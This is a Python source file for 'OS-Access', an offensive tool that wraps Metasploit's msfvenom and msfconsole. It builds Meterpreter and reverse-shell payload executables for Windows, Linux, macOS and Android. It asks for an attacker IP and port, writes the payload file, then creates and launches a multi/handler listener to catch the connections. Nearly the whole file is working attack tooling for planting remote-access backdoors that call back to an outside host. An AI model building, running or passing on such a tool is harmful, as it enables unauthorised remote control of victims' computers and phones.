import getpass
import os
import subprocess
from random2 import randrange

def root():
    user = getpass.getuser()
    if ( user != 'root'):
        print("\033[1;32mPlease run as root")
        exit()

def check_msf_postgresql():
    msf_path='/usr/bin/msfconsole'
    postgresql_path='/etc/init.d/postgresql'
    if os.path.isfile(msf_path) is True:
        if os.path.isfile(postgresql_path) is True:
            pass
        else:
            print("postgresql not installed on your system")
            print("Run command 'apt install postgresql -y'")
            exit()
    else:
        print("msfconsole not installed on your system")
        print("Run command 'apt install metasploit-framework'")
        exit()

def header(i, name):
    if len(i) > 5:
        print("\033[1;37m {} \t\t\t \033[1;31m {}".format(i, name))
    else:
        print("\033[1;37m {} \t\t\t\t \033[1;31m {}".format(i, name))

def header11(name):
    print("\033[1;34m[\033[1;33mID\033[1;34m] \t\t\t    \033[1;34m[\033[1;33m{}\033[1;34m]".format(name))

def header1(i, name):
    print("\033[1;34m[\033[1;37m{}\033[1;34m] \t\t\t \033[1;31m {}".format(i, name))

def banner(bb):
    print('\033[1;3{}m  mmmm   mmmm           mm                                     \n m"  "m #"   "          ##    mmm    mmm    mmm    mmm    mmm  \n #    # "#mmm          #  #  #"  "  #"  "  #"  #  #   "  #   " \n #    #     "#  """    #mm#  #      #      #""""   """m   """m \n  #mm#  "mmm#"        #    # "#mm"  "#mm"  "#mm"  "mmm"  "mmm"\n'.format(bb))

def about():
    print('\033[1;31mCreate By     \t\t\t        \033[1;36m>\033[1;37m \tIHA\n\033[1;31mWritten Language\t        \t\033[1;36m>\033[1;37m \tPython3 & shell\n\033[1;31mSupported Operation System\t\t\033[1;36m>\033[1;37m \tKali Linux\n\033[1;31mPayload Support OS\t\t\t\033[1;36m>\033[1;37m\tLinux, Mac, Android or Window\n\033[1;31mGitHub \t\t\t\t\t\033[1;36m>\033[1;37m\thttps://github.com/IHA-arch\n\n\n')

def Menu():
    i='about'
    name='Tool creater information'
    header(i, name)
    i='os'
    name='payload supported OS'
    header(i, name)
    i='set'
    name='Select OS'
    header(i, name)
    i='help'
    name='Show help'
    header(i, name)
    i='clear'
    name = 'Clear Screen'
    header(i, name)
    i='exit'
    name='For exit'
    header(i, name)

def os_help():
    i='payload'
    name='Show payload list'
    header(i, name)
    i='generate'
    name='Generate payload'
    header(i, name)
    i='listen'
    name='Listen for a payload'
    header(i, name)
    i='help'
    name='Show help'
    header(i, name)
    i='clear'
    name = 'Clear Screen'
    header(i, name)
    i='back'
    name='Go to Back'
    header(i, name)
    i='exit'
    name='For exit'
    header(i, name)

def supported_os():
    name='OS'
    header11(name)
    i='1'
    name='Windows'
    header1(i, name)
    i='2'
    name='Linux'
    header1(i, name)
    i='3'
    name='Mac OS'
    header1(i, name)
    i='4'
    name='Android'
    header1(i, name)


def window_payload():
    name='Payload'
    header11(name)
    i=1
    name='windows/meterpreter/reverse_tcp'
    header1(i, name)
    i=2
    name='windows/meterpreter/reverse_http'
    header1(i, name)
    i=3
    name='windows/meterpreter/reverse_https'
    header1(i, name)
    i=4
    name='windows/shell/reverse_tcp'
    header1(i, name)
    i=5
    name='windows/x64/meterpreter_bind_tcp'
    header1(i, name)
    i=6
    name='windows/x64/meterpreter_reverse_http'
    header1(i, name)
    i=7
    name='windows/x64/meterpreter_reverse_https'
    header1(i, name)
    i=8
    name='windows/x64/meterpreter_reverse_tcp'
    header1(i, name)

def linux_payload():
    name='Payload'
    header11(name)
    i=1
    name='linux/x86/meterpreter/reverse_tcp'
    header1(i, name)
    i=2
    name='linux/x86/shell/reverse_tcp'
    header1(i, name)
    i=3
    name='linux/x64/shell/reverse_tcp'
    header1(i, name)
    i=4
    name='linux/mipsbe/meterpreter/reverse_tcp'
    header1(i, name)
    i=5
    name='linux/mipsbe/meterpreter/reverse_http'
    header1(i, name)
    i=6
    name='linux/mipsle/meterpreter/reverse_tcp'
    header1(i, name)
    i=7
    name='linux/mipsle/shell_reverse_tcp'
    header1(i, name)
    i=8
    name='linux/ppc/shell_reverse_tcp'
    header1(i, name)

def mac_payload():
    name='Payload'
    header11(name)
    i=1
    name='osx/x86/shell_reverse_tcp'
    header1(i, name)
    i=2
    name='osx/x86/meterpreter_reverse_http'
    header1(i, name)
    i=3
    name='osx/x86/meterpreter_reverse_https'
    header1(i, name)
    i=4
    name='osx/x64/shell_reverse_tcp'
    header1(i, name)
    i=5
    name='osx/x64/meterpreter_reverse_http'
    header1(i, name)
    i=6
    name='osx/x64/meterpreter_reverse_https'
    header1(i, name)

def android_payload():
    name='Payload'
    header11(name)
    i=1
    name='android/meterpreter/reverse_tcp'
    header1(i, name)
    i=2
    name='android/meterpreter/reverse_http'
    header1(i, name)
    i=3
    name='android/meterpreter/reverse_https'
    header1(i, name)
    i=4
    name='android/shell/reverse_tcp'
    header1(i, name)
    i=5
    name='android/shell/reverse_http'
    header1(i, name)
    i=6
    name='android/shell/reverse_https'
    header1(i, name)

def window_payload_generate(payload):
    try:
        p_ayload=payload.split(' ')
        payload_id = p_ayload[1]
    except:
        payload_id=''
    fileformat='exe'
    file_ext = '.'+fileformat
    if not payload_id:
        print("Usage: generate <id>")
        payload=''
    elif payload_id == '1':
        payload='windows/meterpreter/reverse_tcp'
    elif payload_id == '2':
        payload='windows/meterpreter/reverse_http'
    elif payload_id == '3':
        payload='windows/meterpreter/reverse_https'
    elif payload_id == '4':
        payload='windows/shell/reverse_tcp'
    elif payload_id == '5':
        payload='windows/x64/meterpreter_bind_tcp'
    elif payload_id == '6':
        payload='windows/x64/meterpreter_reverse_http'
    elif payload_id == '7':
        payload='windows/x64/meterpreter_reverse_https'
    elif payload_id == '8':
        payload='windows/x64/meterpreter_reverse_tcp'
    else:
        print("\033[1;39mpayload id ({}) not valid".format(payload_id))
        payload=''
    generate_ip_port(payload, fileformat, file_ext)

def linux_payload_generate(payload):
    try:
        p_ayload = payload.split(' ')
        payload_id = p_ayload[1]
    except:
        payload_id=''
    fileformat='elf'
    file_ext='.'+fileformat
    if not payload_id:
        print("Usage: generate <id>")
        payload=''
    elif payload_id == '1':
        payload='linux/x86/meterpreter/reverse_tcp'
    elif payload_id == '2':
        payload='linux/x86/shell/reverse_tcp'
    elif payload_id == '3':
        payload='linux/x64/shell/reverse_tcp'
    elif payload_id == '4':
        payload='linux/mipsbe/meterpreter/reverse_tcp'
    elif payload_id == '5':
        payload='linux/mipsbe/meterpreter/reverse_http'
    elif payload_id == '6':
        payload='linux/mipsle/meterpreter/reverse_tcp'
    elif payload_id == '7':
        payload='linux/mipsle/shell_reverse_tcp'
    elif payload_id == '8':
        payload='linux/ppc/shell_reverse_tcp'
    else:
        print("\033[1;39mpayload id ({}) not valid".format(payload_id))
        payload=''
    generate_ip_port(payload, fileformat, file_ext)

def macos_payload_generate(payload):
    try:
        p_ayload = payload.split(' ')
        payload_id = p_ayload[1]
    except:
        payload_id=''
    fileformat='macho'
    file_ext='.'+fileformat
    if not payload_id:
        print("Usage: generate <id>")
        payload=''
    elif payload_id == '1':
        payload='osx/x86/shell_reverse_tcp'
    elif payload_id == '2':
        payload='osx/x86/meterpreter_reverse_http'
    elif payload_id == '3':
        payload='osx/x86/meterpreter_reverse_https'
    elif payload_id == '4':
        payload='osx/x64/shell_reverse_tcp'
    elif payload_id == '5':
        payload='osx/x64/meterpreter_reverse_http'
    elif payload_id == '6':
        payload='osx/x64/meterpreter_reverse_https'
    else:
        print("\033[1;39mpayload id ({}) not valid".format(payload_id))
        payload=''
    generate_ip_port(payload, fileformat, file_ext)

def android_payload_generate(payload):
    try:
        p_ayload = payload.split(' ')
        payload_id=p_ayload[1]
    except:
        payload_id=''
    fileformat='apk'
    file_ext='.'+fileformat
    if not payload_id:
        print("Usage: generate <id>")
        payload=''
    elif payload_id == '1':
        payload='android/meterpreter/reverse_tcp'
    elif payload_id == '2':
        payload='android/meterpreter/reverse_http'
    elif payload_id == '3':
        payload='android/meterpreter/reverse_https'
    elif payload_id == '4':
        payload='android/shell/reverse_tcp'
    elif payload_id == '5':
        payload='android/shell/reverse_http'
    elif payload_id == '6':
        payload='android/shell/reverse_https'
    else:
        print("\033[1;39mpayload id ({}) not valid".format(payload_id))
        payload=''
    generate_ip_port(payload, fileformat, file_ext)

def validIP(address):
    parts = address.split(".")
    if len(parts) != 4:
        return False
    for item in parts:
        try:
            if not 0 <= int(item) <= 255:
                return False
        except ValueError:
            return False
    return True
        

def payload_handler():
    path='/usr/share/OS-Access_IHA/handler.rc'
    if os.path.isfile(path) is True:
        pp='cat {} | grep payload'.format(path)
        payload = subprocess.check_output(pp, shell=True)
        payload = str(payload, 'utf-8').split(' ')
        payload = payload[2].replace('\n','')
        i='payload'
        header(i, payload)
        ii='cat {} | grep LHOST'.format(path)
        ip = subprocess.check_output(ii, shell=True)
        ip = str(ip, 'utf-8').split(' ')
        ip = ip[2].replace('\n', '')
        i="LHOST"
        header(i, ip)
        po='cat {} | grep LPORT'.format(path)
        port = subprocess.check_output(po, shell=True)
        port = str(port, 'utf-8').split(' ')
        port = port[2].replace('\n', '')
        i='LPORT'
        header(i, port)
        print("Starting...")
        cmd='/etc/init.d/postgresql start'
        subprocess.check_output(cmd, shell=True)
        handler_start = 'msfconsole -r handler.rc'
        subprocess.call(handler_start, shell=True)
    else:
        print("\033[1;31mPayload not set for listening, use 'generate <id>' for payload setup")


def payload_generator(ip, port, payload, filename, file_format):
    generate_cmd = 'msfvenom -p {} LHOST={} LPORT={} -f {} > {}'.format(payload, ip, port, file_format, filename)
    print(generate_cmd)
    print("\033[1;32mGenerating Payload....")
    subprocess.call(generate_cmd, shell=True)
    pwd=subprocess.check_output('pwd', shell=True)
    pwd=str(pwd, 'utf-8')
    pwd=pwd.replace("\n", '')
    print("\033[1;34mPayload save at '\033[1;37m{}\033[1;34m' as '\033[1;37m{}\033[1;34m'".format(pwd, filename))
    handler = open("/usr/share/OS-Access_IHA/handler.rc", 'w')
    handler.write("use exploit/multi/handler")
    handler.write("\n")
    handler.write("set payload {}".format(payload))
    handler.write("\n")
    handler.write("set LHOST {}".format(ip))
    handler.write("\n")
    handler.write("set LPORT {}".format(port))
    handler.write("\n")
    handler.write("exploit")
    handler.write("\n")
    handler.close()


def generate_ip_port(payload, file_format, file_ext):
    path='/usr/share/OS-Access_IHA/handler.rc'
    if os.path.isfile(path) is True:
        os.remove(path)
    else:
        pass
    if not payload:
        pass
    else:
        j=True
        k=True
        jk=True
        while j:
            try:
                ip = input("\033[1;33mEnter IP:\033[1;37m")
                if validIP(ip) is True:
                    j=False
                else:
                    print("\033[1;31mInvalid IP \033[1;37m{}".format(ip))
            except KeyboardInterrupt:
                j=False
                k=False
                jk=False
                print("\n", end='')
        
        while k:
            try:
                port = int(input("\033[1;33mEnter PORT:\033[1;37m"))
                if port >=1000 and port <=65535:
                    k=False
                else:
                    print("\033[1;31mInvalid PORT, Please enter port between 1000 to 65535")
            except ValueError:
                print("\033[1;31mport is not intger, please enter only intger value in port")
            except KeyboardInterrupt:
                k=False
                jk=False
                print("\n", end='')
        if jk is False:
            pass
        else:
            file_name = input("\033[1;33mEnter Output file name:\033[1;37m")
            filename=file_name+file_ext
            payload_generator(ip, port, payload, filename, file_format)

def main():
    check_msf_postgresql()
    i=7
    banner(i)
    f='first'
    bb='OS-Access'
    condition=True
    while condition:
        try:
            user = input("\033[1;31m{}\033[1;34m>>\033[1;37m".format(bb))
            if not user:
                pass
            elif user == 'help':
                Menu()
            elif user == 'os':
                supported_os()
            elif 'set' in user:
                try:
                    os=user.split(' ')
                    set_os = os[1]
                except:
                    set_os = ''
                if not set_os:
                    print("Usage: set <id>")
                elif set_os == '1':
                    condition_w=True
                    while condition_w:
                        try:
                            user_w = input("\033[1;31mOS-Access[Window]\033[1;34m>>\033[1;37m")
                            if not user_w:
                                pass
                            elif user_w == 'help':
                                os_help()
                            elif 'generate' in user_w:
                                window_payload_generate(user_w)
                            elif user_w == 'payload':
                                window_payload()
                            elif user_w == 'back':
                                condition_w=False
                                pass
                            elif user_w == 'clear':
                                subprocess.call("clear", shell=True)
                                k=randrange(9)
                                banner(k)
                            elif user_w == 'listen':
                                payload_handler()
                            elif user_w == 'exit':
                                condition_w=False
                                print("\033[1;32mExiting...")
                                exit()
                            else:
                                print("\033[1;39minvalid command \033[1;36m: {}".format(user_w))
                        except KeyboardInterrupt:
                            print("\n", end='')
                            pass
                elif set_os == '2':
                    condition_l=True
                    while condition_l:
                        try:
                            user_l= input("\033[1;31mOS-Access[Linux]\033[1;34m>>\033[1;37m")
                            if not user_l:
                                pass
                            elif user_l == 'help':
                                os_help()
                            elif 'generate' in user_l:
                                linux_payload_generate(user_l)
                            elif user_l == 'payload':
                                linux_payload()
                            elif user_l == 'back':
                                condition_l=False
                                pass
                            elif user_l == 'clear':
                                subprocess.call("clear", shell=True)
                                k=randrange(9)
                                banner(k)
                            elif user_l == 'listen':
                                payload_handler()
                            elif user_l == 'exit':
                                condition_l=False
                                print("\033[1;32mExiting...")
                                exit()
                            else:
                                print("\033[1;39minvalid command \033[1;36m: {}".format(user_l))
                        except KeyboardInterrupt:
                            print("\n", end='')
                            pass
                elif set_os == '3':
                    condition_m=True
                    while condition_m:
                        try:
                            user_m= input("\033[1;31mOS-Access[Mac-OS]\033[1;34m>>\033[1;37m")
                            if not user_m:
                                pass
                            elif user_m == 'help':
                                os_help()
                            elif 'generate' in user_m:
                                macos_payload_generate(user_m)
                            elif user_m == 'payload':
                                mac_payload()
                            elif user_m == 'back':
                                condition_m=False
                                pass
                            elif user_m == 'clear':
                                subprocss.call("clear", shell=True)
                                k=randrange(9)
                                banner(k)
                            elif user_m == 'listen':
                                payload_handler()
                            elif user_m == 'exit':
                                condition_m=False
                                print("\033[1;32mExiting...")
                                exit()
                            else:
                                print("\033[1;39minvalid command \033[1;36m: {}".format(user_l))
                        except KeyboardInterrupt:
                            print("\n", end='')
                            pass 
                elif set_os == '4':
                    condition_a=True
                    while condition_a:
                        try:
                            user_a= input("\033[1;31mOS-Access[Android]\033[1;34m>>\033[1;37m")
                            if not user_a:
                                pass
                            elif user_a == 'help':
                                os_help()
                            elif 'generate' in user_a:
                                android_payload_generate(user_a)
                            elif user_a == 'payload':
                                android_payload()
                            elif user_a == 'back':
                                condition_a=False
                                pass
                            elif user_a == 'clear':
                                subprocess.call("clear", shell=True)
                                k=randrange(9)
                                banner(k)
                            elif user_a == 'listen':
                                payload_handler()
                            elif user_a == 'exit':
                                condition_a=False
                                print("\033[1;32mExiting...")
                                exit()
                            else:
                                print("\033[1;39minvalid command \033[1;36m: {}".format(user_l))
                        except KeyboardInterrupt:
                            print("\n", end='')
                            pass
                elif set_os == 'q':
                    print("\033[1;32mExiting...")
                elif set_os == 'b':
                    bb='OS-Access'
                else:
                    print("\033[1;39mOS id ({}) not valid".format(set_os))
                    bb='OS-Access'


            elif user == 'about':
                about()
            elif user == 'clear':
                subprocess.call("clear", shell=True)
                k=randrange(9)
                banner(k)
            elif user == 'exit' or user == 'quit':
                print("\033[1;32m Exiting....")
                condition=False
                exit()
            else:
                print("\033[1;39minvalid command \033[1;36m: {}".format(user))
                if f == 'first':
                    print("\033[1;39mtype '\033[1;36mhelp\033[1;39m' for more information")
                    f = 'chang'
        except KeyboardInterrupt:
            print("\n", end='')
            pass


main()
